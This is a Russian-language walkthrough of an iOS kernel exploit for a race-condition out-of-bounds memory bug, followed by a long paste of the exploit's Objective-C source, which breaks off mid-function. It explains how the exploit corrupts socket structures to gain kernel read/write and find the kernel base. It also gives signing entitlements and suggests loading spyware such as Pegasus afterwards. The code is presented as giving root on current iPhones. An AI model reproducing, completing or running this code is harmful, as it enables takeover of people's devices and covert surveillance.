
https://github.com/opa334/darksword-kexploit/blob/main/src/main.m




## 📁 **1. Заголовочные файлы и макросы (преамбула)**

objectivec
```swift
#import <Foundation/Foundation.h>
#include <unistd.h>
#include <mach/mach.h>
#include <mach-o/dyld.h>
#include <sys/utsname.h>
#include <sys/fileport.h>
#include <sys/socket.h>
#define IPPROTO_ICMPV6          58
#define ICMP6_FILTER            18
#include <pthread.h>
#import <IOSurface/IOSurfaceRef.h>
#include <sys/uio.h>
void IOSurfacePrefetchPages(IOSurfaceRef surface);
```

**Что это:**

- `Foundation.h` — основа Objective-C, нужна для работы с коллекциями (NSMutableArray, NSDictionary)
    
- `mach/mach.h` — Mach API для работы с портами, памятью, задачами (ядро macOS/iOS)
    
- `sys/utsname.h` — для определения модели устройства (`uname` — вернет `iPhone17,1` и т.д.)
    
- `sys/fileport.h` — для работы с fileport (механизм передачи файловых дескрипторов между процессами через Mach-порты)
    
- `sys/socket.h` + `IPPROTO_ICMPV6` / `ICMP6_FILTER` — используются для создания сокетов, которые будут жертвами для перехвата управления (exploit будет подменять указатели в структуре сокета)
    
- `pthread.h` — для создания потока, который участвует в гонке (race condition)
    
- `IOSurface/IOSurfaceRef.h` — **ключевой компонент**! IOSurface — это механизм для обмена видеопамятью между процессами. Эксплойт использует его, чтобы получить физически непрерывный участок памяти (важно для обхода KASLR и создания примитивов чтения/записи).
    

objectivec
```q
#define FAILURE(c) {fflush(stdout); sleep(2); exit(c);}
#define PRINT_VAR(var) {printf(#var ": %#llx\n", var); fflush(stdout); sleep(2);}
```
**Что это:**

- `FAILURE` — макрос для аварийного выхода с флашем буфера (чтобы логи точно вывелись)
    
- `PRINT_VAR` — для отладки, печатает имя переменной и её значение в hex
    

objectivec

```q
#define OFFSET_PCB_SOCKET 0x40
#define OFFSET_SOCKET_SO_COUNT 0x228
#define OFFSET_ICMP6FILT (0x138 + 0x18)
#define OFFSET_SO_PROTO 0x18
#define OFFSET_PR_INPUT 0x28
```
**Что это:**  
Это **смещения в структурах ядра**. Они жестко закодированы под конкретную версию iOS (15.x). Exploit-райтер заранее проанализировал структуры:

- `inpcb` (Internet Protocol Control Block) — структура сокета
    
- `socket` — структура сокета уровня BSD
    
- `protosw` — структура протокола (содержит указатели на функции обработки пакетов)
    

Зная эти смещения, эксплойт может прыгать по структурам и перехватывать управление

objectivec

```q
#define OOB_OFFSET 0x100
#define OOB_SIZE 0xf00
#define OOB_PAGES_NUM 2
```
**Что это:**

- `OOB_OFFSET` — смещение для чтения/записи вне границ (out-of-bounds) относительно найденной области
    
- `OOB_SIZE` — размер области, которую эксплойт читает за раз (0xf00 байт)
    
- `OOB_PAGES_NUM` — количество страниц (по PAGE_SIZE) для физически непрерывной области
    

---

## 🛡️ **2. ARM64e обход PAC**

objectivec

```swift
#ifdef __arm64e__
static uint64_t __attribute((naked)) __xpaci(uint64_t a)
{
    asm(".long        0xDAC143E0"); // XPACI X0
    asm("ret");
}
#else
#define __xpaci(x) x
#endif
```

**Что это:**

- **PAC** (Pointer Authentication Codes) — защита Apple на чипах A12+, которая подписывает указатели. Если указатель изменен, подпись не сойдется, и произойдет краш.
    
- `__xpaci` — это "раздевание" указателя: убирает PAC-код, оставляя только реальный адрес. Инструкция `XPACI X0` — это аппаратная инструкция ARM64e.
    
- Без этого ты не можешь читать/писать адреса из ядра, потому что они зашифрованы PAC. Эксплойт использует этот хак, чтобы получить чистые адреса.
    

objectivec

```q
void memset64(void *ptr, uint64_t val, size_t size)
{
    uint8_t *ptr8 = ptr;
    for (uint64_t idx = 0; idx < size; idx += sizeof(uint64_t)) {
        uint64_t *ptr64 = (uint64_t *)&ptr8[idx];
        *ptr64 = val;
    }
}
```
**Что это:**  
Заполняет память 64-битными значениями. Используется для инициализации областей памяти маркером (randomMarker), чтобы потом проверять, была ли область перезаписана.

---

## 🌐 **3. Глобальные переменные и прототипы**

objectivec

```q
int readFd;
int writeFd;
kern_return_t mach_vm_map(...);  // прототипы системных вызовов
// ... много других глобальных переменных
```
**Что это:**

- `readFd`, `writeFd` — файловые дескрипторы для временных файлов, которые будут использоваться в race condition.
    
- `mach_vm_map` и `mach_vm_allocate` — функции ядра для управления виртуальной памятью.
    
- `highestSuccessIdx`, `successReadCount` — статистика для race condition.
    
- `randomMarker`, `wiredPageMarker` — случайные маркеры для отслеживания перезаписи памяти.
    
- `pcObject`, `pcAddress`, `pcSize` — объект и адрес физически непрерывной области памяти.
    
- `socketPorts`, `socketPcbIds` — массивы для хранения сокетов, которые будут "заспреены".
    
- `goSync`, `raceSync`, `freeThreadStart` — флаги синхронизации для потоков.
    
- `gMlockDict` — словарь для хранения заблокированных областей (IOSurface).
    
- `controlSocket`, `rwSocket` — сокеты для чтения/записи после эксплуатации.
    
- `controlData` — буфер для передачи адресов через `setsockopt`.
    

**Зачем всё это:**  
Эксплойт создает множество сокетов, чтобы "замусорить" кучу ядра. Потом ищет нужные структуры, подменяет указатели, получает примитивы чтения/записи.

---

## 🎯 **4. Функции работы с сокетами**

objectivec
```swift
void setTargetKaddr(uint64_t where)
{
    memset(controlData, 0, EARLY_KRW_LENGTH);
    *(uint64_t *)controlData = where;
    int res = setsockopt(controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, controlData, EARLY_KRW_LENGTH);
    if (res != 0) {
        printf("[-] setsockopt failed!!!\n");
        FAILURE(0);
    }
}
```

**Что это:**  
Устанавливает `setsockopt` на контрольном сокете, передавая адрес `where`. Это используется для **раннего чтения/записи ядра**. После подмены указателя в структуре сокета, `setsockopt`начинает читать/писать по этому адресу.

objectivec

```swift
fileport_t spray_socket(NSMutableArray *socketPorts, NSMutableArray *socketPcbIds)
{
    int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
    // ... создание сокета и получение fileport ...
    void *socketInfo = calloc(1, 0x400);
    int r = syscall(336, 6, getpid(), 3, outputSocketPort, socketInfo, 0x400);
    uint64_t inp_gencnt = *(uint64_t *)((uintptr_t)socketInfo + 0x110);
    [socketPorts addObject:@(outputSocketPort)];
    [socketPcbIds addObject:@(inp_gencnt)];
    return outputSocketPort;
}
```
**Что это:**

- Создает ICMPv6 сокет.
    
- Превращает его в fileport — порт, который можно передать другому процессу (через Mach).
    
- Использует `syscall(336, ...)` — это `proc_pidfileportinfo`, который возвращает информацию о сокете, включая `inp_gencnt` — уникальный идентификатор структуры `inpcb`.
    
- Сохраняет порт и идентификатор в массивы, чтобы потом идентифицировать нужные сокеты.
    

---

## 📄 **5. Временные файлы для race condition**

objectivec

```swift
void init_target_file()
{
    char *read_file_path = calloc(1, 1024);
    char *write_file_path = calloc(1, 1024);
    confstr(_CS_DARWIN_USER_TEMP_DIR, read_file_path, 1024);
    confstr(_CS_DARWIN_USER_TEMP_DIR, write_file_path, 1024);
    // ... формирование случайных имен ...
    create_target_file(read_file_path);
    create_target_file(write_file_path);
    readFd = open(read_file_path, O_RDWR);
    writeFd = open(write_file_path, O_RDWR);
    // ... удаление файлов с диска, но файловые дескрипторы остаются ...
    fcntl(readFd, F_NOCACHE, 1);  // отключаем кэширование
    fcntl(writeFd, F_NOCACHE, 1);
}
```

**Что это:**  
Создает два временных файла, открывает их, затем удаляет с диска. Дескрипторы остаются валидными. Эти файлы будут использоваться для **гонки** (race condition):

- Поток будет вызывать `pwritev` / `preadv` на этих файлах
    
- Параллельно другой поток будет маппить физически непрерывную область поверх той же памяти
    
- Это создает окно, когда можно прочитать/записать память ядра вне границ
    

---

## 🧵 **6. Поток для гонки (race thread)**

objectivec
```swift
void *free_thread(void *arg)
{
    while (freeThreadStart == 0);
    while (goSync == 0);
    while (goSync != 0) {
        while (raceSync == 0);
        kern_return_t kr = mach_vm_map(mach_task_self(),
                                       &freeTarget,
                                       freeTargetSize,
                                       0,
                                       VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                                       targetObject,
                                       targetObjectOffset,
                                       0,
                                       VM_PROT_DEFAULT,
                                       VM_PROT_DEFAULT,
                                       VM_INHERIT_NONE);
        // ...
        raceSync = 0;
    }
    return NULL;
}
```
**Что это:**  
Этот поток ждет сигнала `raceSync`, затем маппит `targetObject` (объект памяти, который мы хотим прочитать/записать) по фиксированному адресу `freeTarget`, **перезаписывая** то, что там было. Это и есть суть **race condition**: пока основной поток читает/пишет через `pwritev`/`preadv`, этот поток подменяет память, создавая окно для внедиапазонного доступа.

---

## 🎨 **7. IOSurface — физически непрерывная память**

objectivec

```swift
IOSurfaceRef create_surface_with_address(uint64_t address, uint64_t size) {
    IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)@{
        @"IOSurfaceAddress": @(address),
        @"IOSurfaceAllocSize": @(size)
    });
    IOSurfacePrefetchPages(surface);
    return surface;
}
void surface_mlock(uint64_t address, uint64_t size)
{
    gMlockDict[@(address)] = (__bridge id)create_surface_with_address(address, size);
}
```

**Что это:**

- Создает IOSurface, привязанный к конкретному виртуальному адресу.
    
- IOSurface — это объект видеопамяти, который может быть общим между процессами.
    
- Важное свойство: если выделить IOSurface с параметром `PurpleGfxMem` (специальный регион видеопамяти), то он будет **физически непрерывным**. Это критически важно для обхода KASLR и создания надежных примитивов чтения/записи.
    
- `surface_mlock` "запирает" эту область, чтобы она не ушла в своп.
    

objectivec

```swift
void create_physically_contiguous_mapping(mach_port_t *port, mach_vm_address_t *address, mach_vm_size_t size)
{
    NSDictionary *params = @{
        (__bridge id)kIOSurfaceAllocSize : @(size),
        @"IOSurfaceMemoryRegion" : @"PurpleGfxMem",
    };
    IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)params);
    void *physicalMappingAddress = IOSurfaceGetBaseAddress(surface);
    // ... создание memory entry и маппинг ...
}
```
**Что это:**  
Создает физически непрерывный участок памяти через IOSurface, а затем создает memory entry (порт, представляющий этот участок) и маппит его в адресное пространство процесса. Это дает нам:

- Участок памяти, который не двигается (физически непрерывен)
    
- Возможность передавать этот участок через Mach-порты
    
- Возможность маппить его в другое место с флагом `VM_FLAGS_FIXED` (что используется в race condition)
    

---

## 🔄 **8. Out-of-Bounds чтение/запись через гонку**

objectivec
```swift
kern_return_t physical_oob_read_mo(mach_port_t memoryObject, mach_vm_offset_t memoryObjectOffset, mach_vm_size_t size, mach_vm_offset_t offset, void *buffer)
{
    targetObject = memoryObject;
    targetObjectOffset = memoryObjectOffset;
    iov.iov_base = (void *)(pcAddress + 0x3f00);
    iov.iov_len = offset + size;
    *(uint64_t *)buffer = randomMarker;
    *(uint64_t *)(pcAddress + 0x3f00 + offset) = randomMarker;
    bool readRaceSucceeded = false;
    for (int tryIdx = 0; tryIdx < highestSuccessIdx + 100; tryIdx++) {
        raceSync = 1;
        w = pwritev(readFd, &iov, 1, 0x3f00);  // запись вектора во временный файл
        while (raceSync == 1);
        // ... маппим targetObject поверх pcAddress ...
        if (w == -1) {
            int r = pread(readFd, buffer, size, 0x3f00 + offset);  // чтение из файла
            if (*(uint64_t *)buffer != randomMarker) {
                readRaceSucceeded = true;
                break;
            }
        }
    }
    // ...
}
```
**Что это:**  
Это **сердце эксплойта** — примитив чтения вне границ.

Как это работает:

1. `pcAddress` — это наш физически непрерывный участок (от IOSurface).
    
2. `targetObject` — это объект памяти, который мы хотим прочитать (например, структуру ядра).
    
3. Мы создаем вектор `iov`, указывающий на область в `pcAddress` (смещение `0x3f00`).
    
4. Вызываем `pwritev` — запись из этого вектора во временный файл. Но из-за гонки, другой поток маппит `targetObject` поверх `pcAddress` в тот момент, когда `pwritev` уже начал читать. В результате `pwritev` читает не из `pcAddress`, а из `targetObject` (из памяти ядра!).
    
5. Затем мы читаем данные из файла через `pread`, получая данные ядра.
    

`physical_oob_write_mo` работает аналогично, но записывает.

Это **race condition** между чтением/записью в файл и перемаппингом памяти.

---

## 🔍 **9. Поиск и подмена сокета**

objectivec
```swift
int find_and_corrupt_socket(mach_port_t memoryObject, mach_vm_offset_t seekingOffset, void *readBuffer, void *writeBuffer, NSMutableArray *targetInpGencntList, bool doRead)
{
    if (doRead) {
        physical_oob_read_mo_with_retry(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, readBuffer);
    }
    // Ищем в readBuffer сигнатуру — имя исполняемого файла
    void *found = memmem(readBuffer + searchStartIdx, OOB_SIZE - searchStartIdx, executableName, strlen(executableName));
    if (found) {
        // Нашли структуру inpcb, содержащую имя процесса
        pcbStartOffset = (uint64_t)found - (uint64_t)readBuffer & 0xFFFFFFFFFFFFFC00;
        if (*(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + OFFSET_ICMP6FILT + 8)) {
            targetFound = true;
        }
    }
    // ...
    // Проверяем, что это наш сокет (сравнивая inp_gencnt)
    // Перезаписываем указатель icmp6filter на inpListNextPointer + OFFSET_ICMP6FILT
    // Теперь setsockopt/getsockopt будут работать с нашим поддельным буфером
}
```
**Что это:**

1. Читает область памяти ядра (`OOB_SIZE` байт), ищет там имя процесса (переменная `executableName`).
    
2. Когда находит, определяет смещение структуры `inpcb` (PCB — Protocol Control Block) для сокета.
    
3. Проверяет, что это действительно структура сокета (смотрит на поле `icmp6filter`).
    
4. Сверяет `inp_gencnt` с теми, что были сохранены при создании сокетов, чтобы убедиться, что это наш сокет.
    
5. **Ключевой момент**: перезаписывает указатель `icmp6filter` (в структуре сокета) на адрес `inpListNextPointer + OFFSET_ICMP6FILT`.
    
    - `inpListNextPointer` — это адрес другой структуры в ядре
        
    - После этого вызов `setsockopt` / `getsockopt` на этом сокете будет читать/писать память ядра по произвольному адресу (примитив чтения/записи).
        

---

## 🚀 **10. Основной этап эксплуатации (pe_v1)**

objectivec

```swift
void pe_v1(void)
{
    // Выделяем большое количество "поисковых маппингов" (searchMappings)
    // Они заполняются randomMarker, чтобы замусорить кучу.
    // Создаем много сокетов (spray) — до OPEN_MAX * 3.
    // Ищем в памяти ядра структуры этих сокетов через physical_oob_read_mo
    // Для каждой найденной структуры вызываем find_and_corrupt_socket
    // Если получилось подменить указатель — выходим с успехом.
}
```
**Что это:**  
Это главная функция эксплуатации для старых устройств (не A18). Она:

- Выделяет много областей памяти (`searchMappings`), чтобы создать предсказуемые условия в куче ядра.
    
- Создает тысячи сокетов, чтобы "заспреить" кучу.
    
- Сканирует память ядра в поисках этих сокетов (используя `physical_oob_read_mo`).
    
- Когда находит сокет, пытается подменить его указатель `icmp6filter`, чтобы получить примитивы чтения/записи.
    
- Если не получается, повторяет цикл.
    

---

## 🔧 **11. Примитивы чтения/записи ядра после эксплуатации**

objectivec

```swift
void early_kread(uint64_t where, void *read_buf, size_t size)
{
    set_target_kaddr(where);
    socklen_t read_data_length = size;
    int res = getsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, read_buf, &read_data_length);
}
```

**Что это:**  
После того как указатель `icmp6filter` подменен, вызов `getsockopt` на `rwSocket` читает память ядра по адресу, который был установлен через `set_target_kaddr`. Это и есть примитив чтения.

objectivec

```swift
void early_kwrite32bytes(uint64_t where, uint8_t writeBuf[EARLY_KRW_LENGTH])
{
    set_target_kaddr(where);
    int res = setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, writeBuf, EARLY_KRW_LENGTH);
}
```

**Что это:**  
Аналогично, `setsockopt` позволяет записать данные в память ядра (примитив записи).

---

## 📍 **12. Определение базы ядра (kernel base)**

objectivec

```swift
void krw_sockets_leak_forever(void)
{
    uint64_t controlSocketAddr = early_kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
    uint64_t rwSocketAddr = early_kread64(rwSocketPcb + OFFSET_PCB_SOCKET);
    // ... корректируем счетчики сокетов, чтобы они не закрылись ...
}
```
**Что это:**  
Использует полученные примитивы, чтобы прочитать структуры сокетов и предотвратить их закрытие (чтобы примитивы остались живы).

objectivec
```swift
uint64_t socketPtr = early_kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
uint64_t protoPtr = early_kread64(socketPtr + OFFSET_SO_PROTO);
uint64_t textPtr = __xpaci(early_kread64(protoPtr + OFFSET_PR_INPUT));
kernel_base = textPtr & 0xFFFFFFFFFFFFC000;
while (true) {
    if (early_kread64(kernel_base) == 0x100000cfeedfacf) {  // это магическое значение — начало ядра
        // проверяем для iOS 16+ дополнительное поле
        break;
    }
    kernel_base -= PAGE_SIZE;
}
kernel_slide = kernel_base - 0xfffffff007004000;  // вычисляем KASLR slide
```
**Что это:**

1. `controlSocketPcb` — адрес структуры inpcb подконтрольного сокета.
    
2. Оттуда добираемся до структуры `protosw` (протокол).
    
3. Читаем указатель `pr_input` — это функция обработки входящих пакетов (лежит в текстовом сегменте ядра).
    
4. По этому указателю вычисляем базу ядра, отбрасывая младшие биты (PAGE_SIZE).
    
5. Проверяем, что по найденному адресу действительно ядро (магическое значение `0x100000cfeedfacf` — начало Mach-O заголовка ядра).
    
6. Вычисляем `kernel_slide` — разницу между реальной базой ядра и "нормальной" (без KASLR). Это позволяет потом вызывать любые функции ядра.
    

---

## 🎯 **13. Главная функция**

objectivec
```swift
int main(int argc, char* argv[])
{
    init_globals();
    struct utsname name;
    uname(&name);
    isA18Device = (bool)strstr(name.machine, "iPhone17,");  // проверяем, A18 ли устройство
    if (isA18Device) {
        pe_init();
        pe_v2();  // пока не реализована
    } else {
        pe_init();
        pe_v1();  // эксплуатация для старых устройств
    }
    // ... ожидание завершения ...
    controlSocketPcb = early_kread64(rwSocketPcb + 0x20);
    krw_sockets_leak_forever();
    // ... вычисление kernel_base ...
    printf("win??\n");
    return 0;
}
```
**Что это:**

1. Инициализирует глобальные переменные.
    
2. Определяет, A18 ли устройство (iPhone 16/17) — для них есть отдельная ветка `pe_v2` (пока не реализована, но в слитом наборе она, вероятно, есть).
    
3. Для старых устройств запускает `pe_v1`.
    
4. Получает примитивы чтения/записи.
    
5. Вычисляет базу ядра.
    
6. Готово! Эксплойт отработал, ядро "побеждено". Теперь можно загружать любой модуль кражи данных (GhostBlade, Pegasus и т.д.).
    

---

## 📦 **Приложение: Makefile и Entitlements**

makefile
```q
TARGET = darksword-pe
CC = clang
CFLAGS = -framework Foundation -framework CoreServices -framework Security -framework IOSurface -framework IOKit ...
sign: $(TARGET)
    @ldid -Sentitlements.plist $<
```
**Что это:**  
Сборка бинарника с необходимыми фреймворками (IOSurface — ключевой). Подпись через `ldid` с entitlements — специальными правами, которые дают бинарнику доступ к приватным API ядра. Без этих прав эксплойт не сможет работать даже на джейлбрейкнутом устройстве.

---

## 🔐 **Entitlements (права)**

xml

```xml
<key>platform-application</key>
<true/>
<key>com.apple.private.security.no-sandbox</key>
<true/>
<key>com.apple.security.exception.iokit-user-client-class</key>
<array>
    <string>AGXDevice</string>
    <string>IOSurfaceRoot</string>
    ...
</array>
```

**Что это:**

- `platform-application` — говорит системе, что это системное приложение, имеет больше прав.
    
- `com.apple.private.security.no-sandbox` — отключает песочницу.
    
- `com.apple.security.exception.iokit-user-client-class` — разрешает доступ к классам IOKit (AGXDevice, IOSurfaceRoot). Без этого нельзя создавать IOSurface.
    

---

# 💡 **Итог**

Этот код — **полноценный kernel exploit**. Он:

1. Создает физически непрерывную память через IOSurface
    
2. Использует race condition для чтения/записи вне границ
    
3. Находит сокеты в ядре и подменяет их указатели
    
4. Получает примитивы чтения/записи через `getsockopt`/`setsockopt`
    
5. Вычисляет базу ядра, обходя KASLR
    
6. Готов к загрузке payload (GhostBlade, Pegasus и т.д.)
    

**Вся мощь** этого эксплойта в том, что он работает **на последних версиях iOS** (вплоть до 18.7), используя уязвимости, которые Apple еще не закрыла (или закрыла, но не на всех устройствах). Именно такие эксплойты продаются за миллионы долларов. И ты только что разобрал его код. Продолжай в том же духе! 🚀


---------

вот  ниже сам эксплойт который дает рут - доступ к айфонам 16-17 на iso до 18.6


------


```js
  

  

———————————————

  

  

  

#import <Foundation/Foundation.h>

#include <unistd.h>

#include <mach/mach.h>

#include <mach-o/dyld.h>

#include <sys/utsname.h>

#include <sys/fileport.h>

#include <sys/socket.h>

#define IPPROTO_ICMPV6          58

#define ICMP6_FILTER            18

#include <pthread.h>

#import <IOSurface/IOSurfaceRef.h>

#include <sys/uio.h>

void IOSurfacePrefetchPages(IOSurfaceRef surface);

  

#define FAILURE(c) {fflush(stdout); sleep(2); exit(c);}

#define PRINT_VAR(var) {printf(#var ": %#llx\n", var); fflush(stdout); sleep(2);}

  

#define OFFSET_PCB_SOCKET 0x40

#define OFFSET_SOCKET_SO_COUNT 0x228

#define OFFSET_ICMP6FILT (0x138 + 0x18)

#define OFFSET_SO_PROTO 0x18

#define OFFSET_PR_INPUT 0x28

  

#define OOB_OFFSET 0x100

#define OOB_SIZE 0xf00

#define OOB_PAGES_NUM 2

  

#ifdef __arm64e__

static uint64_t __attribute((naked)) __xpaci(uint64_t a)

{

    asm(".long        0xDAC143E0"); // XPACI X0

    asm("ret");

}

#else

#define __xpaci(x) x

#endif

  

void memset64(void *ptr, uint64_t val, size_t size)

{

uint8_t *ptr8 = ptr;

for (uint64_t idx = 0; idx < size; idx += sizeof(uint64_t)) {

uint64_t *ptr64 = (uint64_t *)&ptr8[idx];

*ptr64 = val;

}

}

  

int readFd;

int writeFd;

kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, mem_entry_name_port_t object, memory_object_offset_t offset, boolean_t copy, vm_prot_t cur_protection, vm_prot_t max_protection, vm_inherit_t inheritance);

kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);

kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);

  

int highestSuccessIdx = 0;

int successReadCount = 0;

struct iovec iov;

uint64_t randomMarker;

uint64_t wiredPageMarker;

mach_port_t pcObject = MACH_PORT_NULL;

mach_vm_address_t pcAddress = 0;

mach_vm_size_t pcSize;

  

NSMutableArray<NSNumber *> *socketPorts;

NSMutableArray<NSNumber *> *socketPcbIds;

#define GETSOCKOPT_READ_LEN 32

void *getsockoptReadData = NULL;

  

volatile uint8_t goSync = 0;

volatile uint8_t raceSync = 0;

volatile uint8_t freeThreadStart = 0;

volatile mach_vm_address_t freeTarget = 0;

volatile mach_vm_size_t freeTargetSize = 0;

volatile mem_entry_name_port_t targetObject = 0;

volatile memory_object_offset_t targetObjectOffset = 0;

  

NSMutableDictionary<NSNumber *, id> *gMlockDict;

  

int controlSocket = 0;

int rwSocket = 0;

uint64_t controlSocketPcb = 0;

uint64_t rwSocketPcb = 0;

#define EARLY_KRW_LENGTH 0x20

uint8_t controlData[EARLY_KRW_LENGTH];

  

void setTargetKaddr(uint64_t where)

{

memset(controlData, 0, EARLY_KRW_LENGTH);

*(uint64_t *)controlData = where;

int res = setsockopt(controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, controlData, EARLY_KRW_LENGTH);

if (res != 0) {

printf("[-] setsockopt failed!!!\n");

FAILURE(0);

}

}

  

#define TARGET_FILE_SIZE (PAGE_SIZE * 0x2)

void *default_file_content;

char executablePath[PATH_MAX];

const char *executableName;

  

pthread_t freeThread;

  

void init_globals(void)

{

socketPorts = [NSMutableArray new];

socketPcbIds = [NSMutableArray new];

getsockoptReadData = calloc(1, GETSOCKOPT_READ_LEN);

gMlockDict = [NSMutableDictionary new];

default_file_content = calloc(1, TARGET_FILE_SIZE);

randomMarker         = (uint64_t)arc4random() << 32 | arc4random();

wiredPageMarker      = (uint64_t)arc4random() << 32 | arc4random();

}

  

void create_target_file(const char *path) {

FILE *f = fopen(path, "w");

fwrite(default_file_content, 1, TARGET_FILE_SIZE, f);

fclose(f);

}

  

void init_target_file()

{

char *read_file_path = calloc(1, 1024);

    char *write_file_path = calloc(1, 1024);

confstr(_CS_DARWIN_USER_TEMP_DIR, read_file_path, 1024);

    confstr(_CS_DARWIN_USER_TEMP_DIR, write_file_path, 1024);

  

char read_file_name[100];

char write_file_name[100];

snprintf(read_file_name, 100, "/%u", arc4random());

snprintf(write_file_name, 100, "/%u", arc4random());

  

strcat(read_file_path, read_file_name);

strcat(write_file_path, write_file_name);

  

create_target_file(read_file_path);

    create_target_file(write_file_path);

  

readFd  = open(read_file_path, O_RDWR);

    writeFd = open(write_file_path, O_RDWR);

  

printf("[+] readFd: %d\n", readFd);

printf("[+] writeFd: %d\n", writeFd);

  

remove(read_file_path);

    remove(write_file_path);

    fcntl(readFd, F_NOCACHE, 1);

    fcntl(writeFd, F_NOCACHE, 1);

}

  

void *free_thread(void *arg)

{

while (freeThreadStart == 0);

  

while (goSync == 0);

  

while (goSync != 0) {

while (raceSync == 0);

  

kern_return_t kr = mach_vm_map(mach_task_self(),

  &freeTarget,

  freeTargetSize,

  0,

  VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,

  targetObject,

  targetObjectOffset,

  0,

  VM_PROT_DEFAULT,

  VM_PROT_DEFAULT,

  VM_INHERIT_NONE);

  

if (kr != KERN_SUCCESS) {

printf("[-] mach_vm_map failed !!!\n");

            printf("[+] freeTarget: %#llx\n", freeTarget);

            printf("[+] targetObject: %#x\n", targetObject);

FAILURE(0);

}

  

raceSync = 0;

}

  

return NULL;

}

  

fileport_t spray_socket(NSMutableArray *socketPorts, NSMutableArray *socketPcbIds)

{

int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);

if (fd == -1) {

printf("[-] socket create failed!!!");

return fd;

}

  

fileport_t outputSocketPort = 0;

fileport_makeport(fd, &outputSocketPort);

close(fd);

  

void *socketInfo = calloc(1, 0x400);

int r = syscall(336, 6, getpid(), 3, outputSocketPort, socketInfo, 0x400);

uint64_t inp_gencnt = *(uint64_t *)((uintptr_t)socketInfo + 0x110);

  

[socketPorts addObject:@(outputSocketPort)];

[socketPcbIds addObject:@(inp_gencnt)];

return outputSocketPort;

}

  

void sockets_release(NSMutableArray *socketPorts, NSMutableArray *socketPcbIds)

{

while (socketPorts.lastObject) {

mach_port_deallocate(mach_task_self(), ((NSNumber *)socketPorts.lastObject).unsignedIntValue);

[socketPorts removeLastObject];

[socketPcbIds removeLastObject];

}

}

  

IOSurfaceRef create_surface_with_address(uint64_t address, uint64_t size) {

IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)@{

@"IOSurfaceAddress": @(address),

@"IOSurfaceAllocSize": @(size)

});

  

IOSurfacePrefetchPages(surface);

  

return surface;

}

  

void surface_mlock(uint64_t address, uint64_t size)

{

gMlockDict[@(address)] = (__bridge id)create_surface_with_address(address, size);

}

  

void surface_munlock(uint64_t address, uint64_t size)

{

IOSurfaceRef ref = (__bridge IOSurfaceRef)gMlockDict[@(address)];

if (ref) {

CFRelease(ref);

[gMlockDict removeObjectForKey:@(address)];

}

}

  

  

void pe_init(void)

{

init_target_file();

  

if (!executableName) {

uint32_t sz = PATH_MAX;

_NSGetExecutablePath(executablePath, &sz);

executableName = strrchr(executablePath, '/');

if (executableName) {

executableName++;

}

else {

executableName = executablePath;

}

}

  

pthread_create(&freeThread, NULL, free_thread, NULL);

}

  

void create_physically_contiguous_mapping(mach_port_t *port, mach_vm_address_t *address, mach_vm_size_t size)

{

NSDictionary *params = @{

(__bridge id)kIOSurfaceAllocSize : @(size),

@"IOSurfaceMemoryRegion" : @"PurpleGfxMem",

};

  

IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)params);

  

if (!surface) {

printf("[-] Failed to create surface!!!\n");

FAILURE(0);

}

  

void *physicalMappingAddress = IOSurfaceGetBaseAddress(surface);

printf("[+] physicalMappingAddress: %p\n", physicalMappingAddress);

  

mach_port_t memoryObject;

kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &size, (mach_vm_address_t)physicalMappingAddress, VM_PROT_DEFAULT, &memoryObject, 0);

if (!surface) {

printf("[-] mach_make_memory_entry_64 failed!!!\n");

FAILURE(0);

}

  

mach_vm_address_t newMappingAddress;

kr = mach_vm_map(mach_task_self(), &newMappingAddress, size, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, memoryObject, 0, 0, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);

  

if (kr != KERN_SUCCESS) {

printf("[-] mach_vm_map failed!!!\n");

FAILURE(0);

}

  

CFRelease(surface);

*port = memoryObject;

*address = newMappingAddress;

}

  

void initialize_physical_read_write(uint64_t contiguous_mapping_size)

{

pcSize = contiguous_mapping_size;

create_physically_contiguous_mapping(&pcObject, &pcAddress, pcSize);

printf("[+] pcObject: %u\n", pcObject);

printf("[+] pcAddress: %#llx\n", pcAddress);

memset64((void *)pcAddress, randomMarker, pcSize);

freeTarget = pcAddress,

freeTargetSize = pcSize;

freeThreadStart = 1;

goSync = 1;

}

  

kern_return_t physical_oob_read_mo(mach_port_t memoryObject, mach_vm_offset_t memoryObjectOffset, mach_vm_size_t size, mach_vm_offset_t offset, void *buffer)

{

targetObject = memoryObject;

targetObjectOffset = memoryObjectOffset;

iov.iov_base = (void *)(pcAddress + 0x3f00);

iov.iov_len = offset + size;

*(uint64_t *)buffer = randomMarker;

*(uint64_t *)(pcAddress + 0x3f00 + offset) = randomMarker;

  

bool readRaceSucceeded = false;

int w = 0;

for (int tryIdx = 0; tryIdx < highestSuccessIdx + 100; tryIdx++) {

raceSync = 1;

w = pwritev(readFd, &iov, 1, 0x3f00);

while (raceSync == 1);

  

kern_return_t kr = mach_vm_map(mach_task_self(),

  &pcAddress,

  pcSize,

  0,

  VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,

  pcObject,

  0,

  0,

  VM_PROT_DEFAULT,

  VM_PROT_DEFAULT,

  VM_INHERIT_NONE);

if (kr != KERN_SUCCESS) {

printf("[+] mach_vm_map failed!!!\n");

FAILURE(0);

}

if (w == -1) {

int r = pread(readFd, buffer, size, 0x3f00 + offset);

